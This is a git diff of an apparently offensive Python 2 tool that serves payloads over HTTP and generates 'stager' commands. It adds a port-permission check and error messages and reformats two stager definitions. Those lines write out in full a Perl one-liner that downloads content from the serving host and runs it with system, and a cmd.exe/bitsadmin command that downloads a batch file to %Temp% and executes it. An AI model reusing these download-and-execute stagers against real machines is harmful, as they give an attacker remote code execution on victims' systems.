@@ -4,6 +4,7 @@ from classes import base64_wrapper, xor_wrapper
 from SimpleHTTPServer import SimpleHTTPRequestHandler
 from SocketServer import TCPServer
 from socket import *
+import os
 
 
 class HTTPServer(object):
@@ -14,11 +15,17 @@ class HTTPServer(object):
         """
         We probe this port, to check if it is available.
         """
+        # Non privileged users can't bind to a port below 1024
+        if os.geteuid() != 0 and self.port < 1024:
+            print(error("Error: Can't use port {0} as HTTP server port: Permission denied".format(self.port)))
+            return False
+
         sock = socket(AF_INET, SOCK_STREAM)
         sock.settimeout(3.0)  # maximum delay
         try:
             sock.connect(('', self.port))
             sock.close()
+            print(error("Error: Can't use port {0} as HTTP server port: Port in use.".format(self.port)))
             return False
         except:
             sock.close()
@@ -72,9 +79,7 @@ class Perl_HTTP_Stager(HTTPStager):
         self.args = args
         self.host = conn_info[0]
         self.port = conn_info[1]
-        self.payload = """perl -e 'use LWP::UserAgent;my $u=new LWP::UserAgent;my $d="http://{0}:{1}/{2}";my $req=new HTTP::Request("GET", $d);my $res=$u->request($req);my $c=$res->content();system $c' """.format(self.host,
-                                                                                                       self.port,
-                                                                                                       filename)
+        self.payload = """perl -e 'use LWP::UserAgent;my $u=new LWP::UserAgent;my $d="http://{0}:{1}/{2}";my $req=new HTTP::Request("GET", $d);my $res=$u->request($req);my $c=$res->content();system $c' """.format(self.host, self.port, filename)
 
 
 class Wget_HTTP_Stager(HTTPStager):
@@ -144,9 +149,7 @@ class BitsAdmin_HTTP_Stager(HTTPStager):
         self.args = args
         self.host = conn_info[0]
         self.port = conn_info[1]
-        self.payload = """cmd.exe /c "bitsadmin.exe /transfer {0} /download /priority normal http://{1}:{2}/{3} %Temp%\\{3}.bat && start /b cmd.exe /c %Temp%\\{3}.bat" """.format(generate_file_name(),
-                                                                                              self.host, self.port,
-                                                                                              filename)
+        self.payload = """cmd.exe /c "bitsadmin.exe /transfer {0} /download /priority normal http://{1}:{2}/{3} %Temp%\\{3}.bat && start /b cmd.exe /c %Temp%\\{3}.bat" """.format(generate_file_name(), self.host, self.port, filename)
 
 
 class VbScriptHttpStager(HTTPStager):
@@ -184,7 +187,7 @@ def choose_stager(stagers):
         i += 1
     n = int(raw_input(info("Stager number: ")), 10) # decimal
     if n > len(stagers) or n < 1:
-        print(error("You cant choose a stager option number higher than the maximum amount of available stagers. Setting it to 1."))
+        print(error("You can't choose a stager option number higher than the maximum amount of available stagers. Setting it to 1."))
         n = 1
     print("\n")
     # Loop through each of them.
